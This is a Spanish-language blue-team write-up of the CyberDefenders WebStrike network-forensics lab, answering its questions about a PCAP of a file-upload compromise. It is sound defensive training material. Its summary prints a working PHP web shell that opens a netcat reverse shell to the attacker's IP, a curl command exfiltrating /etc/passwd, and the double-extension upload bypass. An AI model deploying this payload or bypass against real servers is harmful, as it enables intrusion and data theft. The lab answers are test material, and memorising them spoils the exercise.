# 🔍 WebStrike Lab WriteUp – Network Forensics (CyberDefenders)

## 🧩 Escenario del Laboratorio

**Contexto**: Una empresa detecta actividad sospechosa en su servidor web de e-commerce (shoporoma.com). Se sospecha que un actor externo intentó comprometer el servidor mediante la subida de archivos maliciosos.  
**Objetivo**: Analizar un PCAP con Wireshark para identificar el origen del atacante, la técnica de intrusión, el webshell subido y la exfiltración de datos post-compromiso.  
**Herramientas**: Wireshark, IP Geolocation Lookup.  
**Tácticas**: Initial Access | Execution | Command and Control.

En el laboratorio nos entregan un PCAP para análisis de compromiso de servidor web vía file upload malicioso.

***

## 📋 Preguntas del Laboratorio & Respuestas

| Q1 | Understanding the geographical origin of an attack helps in assessing its severity and urgency. Can you identify the city from which the attack originated?
-
Observando el tráfico HTTP en Wireshark, identificamos la IP atacante como **117.11.88.124**. Realizando una consulta de geolocalización con la herramienta IP Geolocation Lookup, confirmamos el origen geográfico del atacante.

<img width="1274" height="467" alt="1" src="https://github.com/user-attachments/assets/99b3da02-8266-4d79-831c-f7594a3254f1" />

**R:** `Tianjin`

------

| Q2 | Knowing the attacker's user-agent assists in creating accurate filtering rules. What's the attacker's user-agent?
-
Analizando las peticiones HTTP generadas desde la IP atacante hacia el servidor shoporoma.com, podemos leer directamente el campo User-Agent en los headers de cada request.

<img width="1919" height="707" alt="2" src="https://github.com/user-attachments/assets/5ecd67c4-128e-445b-8b2d-f275414897f5" />

**R:** `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0`

------

| Q3 | We need to identify if there were multiple attempts to exploit the file upload vulnerability. What is the name of the malicious file used in the first upload attempt?
-
Filtrando por peticiones POST al endpoint `/reviews/upload.php` y revisando los uploads en orden cronológico, encontramos que en el primer intento el atacante subió un archivo bajo el nombre `image.php`. El servidor respondió con **"Invalid file format"**, indicando que fue rechazado por no cumplir con la validación de extensión esperada.

<img width="1919" height="697" alt="3" src="https://github.com/user-attachments/assets/cfdd25ea-6696-4f0b-b343-9d6b0aaa7cad" />

Posterior a esto, podemos corroborar que el atacante aplicó una ofuscación del archivo malicioso aplicando una doble extensión. Logrando así pasar el filtro del sitio web.

<img width="1919" height="648" alt="3 1" src="https://github.com/user-attachments/assets/ed7e7006-b79d-4a47-bd49-4d44406412d4" />


**R:** `image.jpg.php`

------

| Q4 | Knowing the directory where files are uploaded is important for locating malicious files and understanding the server's file structure. What is the path of the directory used by the attacker to store the uploaded files?
-
Después de los intentos de upload, el atacante realizó un GET request al path `/reviews/uploads` que recibió una redirección `301 Moved Permanently` hacia `/reviews/uploads/`. La segunda solicitud devolvió `200 OK`, confirmando la existencia y accesibilidad pública del directorio de uploads.

<img width="1919" height="687" alt="4" src="https://github.com/user-attachments/assets/38647344-e3d4-4122-991e-0faf5d2c0db8" />


**R:** `/reviews/uploads/`

------

| Q5 | Identifying the port utilized by the web shell helps improve firewall configurations for blocking unauthorized outbound traffic. What port was used by the malicious web shell?
-
Una vez confirmado el upload exitoso, analizamos el contenido del webshell embebido en el archivo. El payload PHP ejecuta un reverse shell utilizando Netcat, conectándose de vuelta al servidor del atacante (117.11.88.124) en el puerto **8080**.

<img width="947" height="596" alt="5" src="https://github.com/user-attachments/assets/981fc5fc-df23-4700-a18d-212ddb5ce93a" />

**R:** `8080`

------

| Q6 | Understanding the value of compromised data assists in prioritizing incident response actions. What file was the attacker trying to exfiltrate?
-
Siguiendo el tráfico posterior al establecimiento de la reverse shell, observamos que el atacante ejecutó un comando `curl` realizando un POST request con el contenido del archivo `/etc/passwd` hacia su servidor de comando y control. Este archivo contiene información de todos los usuarios del sistema comprometido.

<img width="1589" height="763" alt="6" src="https://github.com/user-attachments/assets/fcf6f3e5-5f0e-4c11-abde-e95acb8d5630" />

**R:** `/etc/passwd`

------

## 🔬 Resumen del Proceso de Análisis

### 1. **Identificación del Atacante**
IP: 117.11.88.124 (Tianjin, China)  
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0  
Target: shoporoma.com – endpoint `/reviews/upload.php`

### 2. **Timeline del Ataque – File Upload**
Primer intento → Upload fallido: `image.php` → "Invalid file format"  
Segundo intento → Upload exitoso: `image.jpg.php` → "File uploaded successfully"  
Bypass: Doble extensión (.jpg.php) para evadir la validación del servidor

### 3. **Reconocimiento Post-Upload**
GET `/reviews/uploads` → 301 → GET `/reviews/uploads/` → 200 OK  
Directorio de uploads confirmado y accesible públicamente

### 4. **Reverse Shell & Exfiltración**
Payload: `<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>`  
C2: 117.11.88.124:8080  
Exfil: `curl -X POST -d /etc/passwd` → 117.11.88.124  
MITRE: T1505.003 - Web Shell | T1059.004 - Unix Shell | T1041 - Exfiltration Over C2 Channel

***

## 🔬 Herramientas Utilizadas

Análisis de Red

├── Wireshark → PCAP dissection, HTTP streams, TCP stream follow

└── IP Geolocation Lookup → Geolocalización de IP atacante

***

## 📊 Lecciones Aprendidas

1. **File Upload Validation**: Los servidores deben verificar correctamente el tipo real del archivo que se sube, no solo el nombre. Permitir extensiones dobles como `.jpg.php` es una configuración insegura que puede derivar en compromisos graves.

2. **Detección de Webshells**: Un archivo subido que luego genera tráfico de red saliente desde el servidor es una señal de alerta clara. Monitorear conexiones inesperadas hacia IPs externas es una práctica básica de defensa.

3. **Protección de archivos sensibles**: Archivos como `/etc/passwd` contienen información crítica del sistema. Su exfiltración indica que el atacante ya tiene ejecución de comandos en el servidor, lo que escala la severidad del incidente considerablemente.

***

> **Santiago Daniel Sandili** – SOC Analyst L1 Portfolio  
> *CyberDefenders Blue Team Lab: WebStrike (Network Forensics Category)*
